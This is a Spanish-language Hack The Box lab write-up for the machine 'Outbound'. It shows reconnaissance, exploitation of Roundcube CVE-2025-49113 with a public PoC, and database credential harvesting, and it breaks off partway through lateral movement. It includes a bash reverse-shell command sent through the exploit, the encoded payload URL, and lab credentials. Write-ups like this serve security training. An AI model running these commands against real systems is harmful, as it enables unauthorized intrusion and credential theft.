---
title: "HTB Outbound"
date: 2025-11-15 00:35:00 +0000
categories: [WriteUps, Hack The Box, Linux, Easy]
tags: [Roundcube, CVE-2025-49113, MariaDB, Roundcube-DecryptPasswordSessionVar, InformationLeakage, Sudoers, Below, Symlinks, CVE-2025-27591]
image: /assets/img/writeups/htb-outbound/HTB-Outbound_logo.png
---

`Outbound` es una máquina Linux de dificultad fácil que presenta una instancia de Roundcube Webmail vulnerable. La explotación comienza identificando la vulnerabilidad **CVE-2025-49113** en Roundcube, que permite una deserialización insegura de objetos PHP. Mediante esta vulnerabilidad, se ejecuta un payload malicioso que establece una reverse shell, obteniendo acceso inicial como el usuario `www-data`. Dentro del sistema, se descubre que Roundcube almacena las credenciales IMAP de los usuarios cifradas en la base de datos MariaDB. Utilizando la clave DES encontrada en la configuración de Roundcube, se descifra la contraseña del usuario `jacob`, permitiendo el acceso SSH a la máquina. Para la escalada de privilegios, se identifica que el usuario `jacob` puede ejecutar el comando `/usr/bin/below` con privilegios de root mediante sudo, excluyendo ciertas opciones. Investigando este binario, se descubre la vulnerabilidad **CVE-2025-27591**, que implica una asignación incorrecta de permisos en el directorio `/var/log/below`, permitiendo a usuarios locales no privilegiados realizar ataques de enlace simbólico. Aprovechando esta vulnerabilidad, se manipula el archivo `/etc/passwd` mediante un enlace simbólico, creando un nuevo usuario con privilegios de root y obteniendo así acceso completo al sistema.


----
## Reconnaissance

A través de la herramienta de `rustscan` realizaremos un escaneo de la dirección IP establecida en la variable `IP`. El escaneo se realizará en todos los puertos existentes y se realizará además un escaneo de versiones y de scripts básicos de reconocimiento que nos proporciona `Nmap` por defecto.

En el resultado obtenido verificamos que se encuentra expuesto el puerto 22 (`SSH`) y 80 (`HTTP`) con una página web en un servidor Nginx, que realiza una redirección a `http://mail.outbound.htb`.

```sh
❯ export IP=10.10.11.77           

❯ rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -o nmapresult.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 1000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sC -sV -o nmapresult.txt" on ip 10.10.11.77
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2025-11-13 05:57 CET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:57, 0.00s elapsed
Initiating Ping Scan at 05:57
Scanning 10.10.11.77 [4 ports]
Completed Ping Scan at 05:57, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:57
Completed Parallel DNS resolution of 1 host. at 05:57, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:57
Scanning 10.10.11.77 [2 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
Completed SYN Stealth Scan at 05:57, 0.07s elapsed (2 total ports)
Initiating Service scan at 05:57
Scanning 2 services on 10.10.11.77
Completed Service scan at 05:57, 7.13s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.77
Retrying OS detection (try #2) against 10.10.11.77
Initiating Traceroute at 05:57
Completed Traceroute at 05:57, 0.09s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 05:57
Completed Parallel DNS resolution of 2 hosts. at 05:57, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.11.77.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:57
Completed NSE at 05:58, 2.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.63s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 63 (0.050s latency).
Scanned at 2025-11-13 05:57:47 CET for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 (94%), Linux 5.0 - 5.3 (94%), Linux 5.4 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=11/13%OT=22%CT=%CU=41804%PV=Y%DS=2%DC=T%G=N%TM=69156559%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)
SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.375 days (since Mon Nov 10 20:57:54 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   88.78 ms 10.10.16.1
2   23.53 ms 10.10.11.77

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
           Raw packets sent: 69 (5.130KB) | Rcvd: 43 (3.590KB)
```

A través de la herramienta `cURL` comprobaremos las cabeceras de la página web, en el resultado obtenido verificamos la redirección a `http:/mail.outbound.htb` como habíamos comprobado en el resultado anterior. En nuestro archivo `/etc/hosts` añadiremos la entrada correspondiente para poder resolver correctamente a ese dominio.

Una vez añadida la entrada, comprobaremos las tecnologías presentes en la página web y información útil a través de `whatweb`. En el resultado obtenido, verificamos que al parecer se trata de un servidor de correo `Roundcube` que analizaremos a continuación.

```sh
❯ curl -I $IP                                          
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.24.0 (Ubuntu)
Date: Thu, 13 Nov 2025 05:00:54 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://mail.outbound.htb/

❯ echo "$IP mail.outbound.htb" | tee -a /etc/hosts
10.10.11.77 mail.outbound.htb

❯  whatweb -a 3 http://mail.outbound.htb 
http://mail.outbound.htb [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.10.11.77], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
```
---
## Initial Foothold

### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

Al acceder a `http://mail.outbound.htb` nos encontramos con un servidor de correo electrónico `Roundcube`. Probaremos de acceder a través de las credenciales que se nos han proporcionado.

En algunas máquinas de HTB, a veces se nos proporcionan credenciales de acceso inicial, como en este caso: (`tyler`/`LhKL1o9Nm3X2`).

![image](/assets/img/writeups/htb-outbound/Outbound_1.png)

{: .prompt-info }

> **Roundcube** es un cliente de correo electrónico basado en web, también conocido como webmail, que permite acceder a cuentas de correo a través de un navegador web. Facilita la gestión del correo electrónico, agenda de contactos y calendario, sin necesidad de instalar software adicional.
{: .prompt-info }


![image](/assets/img/writeups/htb-outbound/Outbound_2.png)

Al acceder al `Roundcube` con las credenciales proporcionadas, nos encontramos en la bandeja de entrada del usuario `tyler`. En su bandera de entrada no localizamos ningún tipo de correo recibido ni enviado. Le daremos a la opción de `About` para localizar la versión de `Roundcube`, con el objetivo de intentar localizar alguna vulnerabilidad reportada para dicha versión que nos pueda brindar acceso adicional al sistema.

![image](/assets/img/writeups/htb-outbound/Outbound_3.png)

Verificamos en la información de `Roundcube` que se encuentra en la versión 1.6.10. Esta información es crucial para un atacante, ya que es altamente posible que existan vulnerabilidades críticas reportadas para esta versión u otra. Siempre hay que revisar si la versión de un software es vulnerable o no a una vulnerabilidad ya reportada.

![image](/assets/img/writeups/htb-outbound/Outbound_4.png)

Tras realizar una búsqueda de vulnerabilidades para la versión desplegada de Roundcube, hemos identificado el `CVE-2025-49113`, una vulnerabilidad crítica de deserialización insegura en PHP. Según múltiples fuentes y análisis técnicos públicos, este fallo podría permitir la ejecución remota de código (RCE) en el sistema afectado.

Dado que el servicio `mail.outbound.htb` parece ejecutar una versión vulnerable de Roundcube, la explotación exitosa de este CVE podría conceder acceso remoto al servidor, lo que facilitaría la obtención de una shell interactiva y el control del entorno comprometido.

- [https://fearsoff.org/research/roundcube](https://fearsoff.org/research/roundcube)
- [https://www.offsec.com/blog/cve-2025-49113/](https://www.offsec.com/blog/cve-2025-49113/)
- [https://github.com/fearsoff-org/CVE-2025-49113](https://github.com/fearsoff-org/CVE-2025-49113)

> Roundcube Webmail anterior a 1.5.10 y 1.6.x anterior a 1.6.11 permite la ejecución remota de código por parte de usuarios autenticados porque el parámetro _from en una URL no está validado en program/actions/settings/upload.php, lo que lleva a la deserialización de objetos PHP.
{: .prompt-danger }

![image](/assets/img/writeups/htb-outbound/Outbound_5.png)

En nuestro equipo nos clonaremos el siguiente repositorio para poder explotar la vulnerabilidad de PHP Deserialization.

```sh
❯ git clone https://github.com/fearsoff-org/CVE-2025-49113; cd CVE-2025-49113                                                                                                      
Cloning into 'CVE-2025-49113'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (8/8), 7.33 KiB | 3.67 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

Por otro lado, nos pondremos en escucha con la herramienta de `pwncat-cs`, para poder recibir la reverse shell que nos trataremos de enviar a través de la vulnerabilidad indicada en el punto anterior.

> `pwncat-cs` es un framework post-explotación avanzado que funciona como una solución de Command and Control (C2) ligera para entornos locales. A diferencia de una shell convencional, actúa como un centro de control que permite gestionar múltiples sesiones simultáneas, automatizar tareas de enumeración y mantener persistencia en los sistemas comprometidos.
{: .prompt-info }

```sh
❯ pwncat-cs -lp 444
[06:08:03] Welcome to pwncat 🐈! 
bound to 0.0.0:444 --------------------------------------------------------------------
```

Revisando el `README.md` del GitHub del PoC de la vulnerabilidad, tenemos que ejecutar el siguiente comando. En el cual, especificaremos el target donde se encuentra `Roundcube`, las credenciales de acceso que disponemos (ya que es una vulnerabilidad Post-Auth) y finalmente el comando que queremos ejecutar en el sistema.

Haremos que a través de la vulnerabilidad de PHP Deserialización se ejecute una reverse shell hacía nuestro equipo, para asi establecernos una conexión remota y obtener el control del sistema. Verificamos que el payload al parecer se ha inyectado y ejecutado aprovechando la vulnerabilidad.

```sh
❯ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.116/444 0>&1'"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.116/444 0>&1'

### Injecting payload...

### End payload: http://mail.outbound.htb//?_from=edit-%21%C8%22%C8%3B%C8i%C8%3A%C80%C8%3B%C8O%C8%3A%C81%C86%C8%3A%C8%22%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%22%C8%3A%C81%C8%3A%C8%7B%C8S%C8%3A%C82%C86%C8%3A%C8%22%C8%5C%C80%C80%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%5C%C80%C80%C8_%C8g%C8p%C8g%C8c%C8o%C8n%C8f%C8%22%C8%3B%C8S%C8%3A%C85%C88%C8%3A%C8%22%C8%2F%C8b%C8i%C8n%C8%2F%C8b%C8a%C8s%C8h%C8+%C8-%C8c%C8+%C8%27%C8b%C8a%C8s%C8h%C8+%C8-%C8i%C8+%C8%3E%C8%26%C8+%C8%2F%C8d%C8e%C8v%C8%2F%C8t%C8c%C8p%C8%2F%C81%C80%C8%5C%C82%C8e%C81%C80%C8%5C%C82%C8e%C81%C86%C8%5C%C82%C8e%C81%C81%C86%C8%2F%C84%C84%C84%C8+%C80%C8%3E%C8%26%C81%C8%27%C8%3B%C8%23%C8%22%C8%3B%C8%7D%C8i%C8%3A%C80%C8%3B%C8b%C8%3A%C80%C8%3B%C8%7D%C8%22%C8%3B%C8%7D%C8%7D%C8&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...
```

En nuestra terminal donde mantenemos escucha con `pwncat-cs`, confirmamos que recibimos una conexión entrante desde el sistema que aloja `Roundcube`. Para acceder a la sesión interactiva, ejecutamos la combinación de teclas (`Ctrl + D`), obteniendo así una shell completamente interactiva.

A continuación, exportamos la variable de entorno `TERM` con el valor `xterm` para habilitar funcionalidades avanzadas de terminal, como la limpieza de pantalla mediante (`Ctrl + L`) entre otras.

Al ejecutar el comando `hostname`, verificamos que efectivamente nos encontramos en el equipo interno `mail.outbound.htb`, observando además que posee una dirección IP diferente a la máquina objetivo principal. Esto confirma que el servidor de `Roundcube` está desplegado en un entorno independiente, separado del servidor principal, nuestro objetivo final.

```sh
❯ pwncat-cs -lp 444            
[06:09:03] Welcome to pwncat 🐈!                                                                                                                                                                                          __main__.py:164
[06:11:23] received connection from 10.10.11.77:60614                                                                                                                                                                          bind.py:84
[06:11:25] 10.10.11.77:60614: registered new host w/ db                                                                                                                                                                    manager.py:957
(local) pwncat$                                                                                                                                                                                                                          
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ export TERM=xterm
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ hostname 
mail.outbound.htb
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ hostname -I
172.17.0.2 
```

---

## Lateral Movement
### Database Enumeration

El siguiente paso es tratar de movernos lateralmente y conseguir acceso adicional en el sistema. Es por ello, que decidimos revisar el archivo de configuración de `Roundcube` que realizando una búsqueda por Internet, posiblemente se encuentre en la siguiente ubicación.

![image](/assets/img/writeups/htb-outbound/Outbound_7.png)

Finalmente logramos encontrar el archivo de configuración en la ruta `/var/www/html/roundcube/config/config.inc.php`. Al revisar su contenido, descubrimos las credenciales de acceso al servicio MySQL que utiliza Roundcube para gestionar su base de datos. Este hallazgo nos proporciona un punto de entrada adicional, con la posibilidad de encontrar hashes de contraseñas, credenciales en texto plano, y otra información sensible almacenada en la base de datos.

```sh
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ head -n 28 config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Antes de intentar acceder a la base de datos, revisaremos qué usuarios pueden ser nuestro próximo objetivo. Es por ello, que decidimos revisar tanto el `/etc/passwd` filtrando por aquellos que tienen `/bin/bash`, y por otra parte, revisando quien dispone actualmente de un directorio personal en `/home/`.

En el resultado obtenido, nos encontramos con 3 usuarios los cuales podrían ser los siguientes que debamos obtener para ganar más acceso en el sistema.

```sh
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000::/home/tyler:/bin/bash
jacob:x:1001:1001::/home/jacob:/bin/bash
mel:x:1002:1002::/home/mel:/bin/bash
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ ls -l /home/
total 20
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
```

A través de `mysql` nos conectaremos utilizando las credenciales `roundcube`/`RCDBPass2025` a la base de datos `roundcube`, verificando que obtenemos acceso correctamente. Al enumerar las tablas disponibles en esta base de datos, identificamos la tabla `users`, que inmediatamente capta nuestra atención por su potencial contenido sensible.

```bash
(remote) www-data@mail.outbound.htb:/var/www/html/roundcube/config$ mysql -h localhost -u roundcube -pRCDBPass2025 -D roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 140
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

Al revisar el esquema de la base de datos de Roundcube, nuestro primer paso lógico fue examinar la tabla users con la esperanza de encontrar credenciales de acceso o hashes de contraseñas que pudieran ser útiles. Como se puede observar en los resultados, la tabla `users` contiene metadatos de los usuarios (nombres de usuario, fechas de creación/inicio de sesión, preferencias), pero **no almacena las contraseñas** de los usuarios ni sus hashes de autenticación permanentes.

> Roundcube funciona como un cliente de correo web, no como el servidor de correo por sí mismo (es decir, Roundcube no es el software que gestiona el almacenamiento físico de los correos y las contraseñas, solo es la interfaz web para acceder a ellos). Su base de datos se limita a gestionar la interfaz de usuario, las sesiones y la libreta de direcciones.
>
>Cuando un usuario inicia sesión, Roundcube simplemente retransmite las credenciales introducidas al **servidor IMAP/POP3** subyacente (en este caso, configurado como `localhost`). Es en el sistema de *backend* de ese servidor de correo (ej. Dovecot, Postfix, o un servicio de directorio LDAP/Active Directory) donde realmente residen las contraseñas o sus hashes seguros.
>
>Por lo tanto, la base de datos de Roundcube no nos proporciona las credenciales que necesitamos; debemos centrar nuestra atención en el sistema operativo subyacente y la configuración del servidor de correo.
{: .prompt-info }

```sh
MariaDB [roundcube]> SELECT * FROM users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-11-13 05:11:23 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"cFkNuaeS4C5okA5E";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.001 sec)
```

Como Roundcube funciona como cliente de correo web y no almacena contraseñas permanentemente, cambiamos nuestro enfoque hacia la tabla `sessions`. Esta tabla se utiliza para almacenar datos de sesión compartidos en el lado del servidor, manteniendo el estado del usuario mientras navega por la interfaz web.

>Entre la información que almacena la tabla sessions se incluye:
>
>- Identificador de sesión único para rastrear la sesión del usuario
>
>- Datos de autenticación que confirman que el usuario ha iniciado sesión correctamente
>
>- La contraseña cifrada - Para facilitar la comunicación con el servidor IMAP/SMTP sin pedir repetidamente la contraseña al usuario. Es importante destacar que no es la contraseña en texto plano, sino una versión cifrada que solo Roundcube puede utilizar con su clave de cifrado (que se encuentra en el archivo de configuración de Roundcube). 
{: .prompt-info }

En la tabla sessions encontramos un registro con datos serializados codificados en base64.

```sh
MariaDB [roundcube]> SELECT * FROM session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToi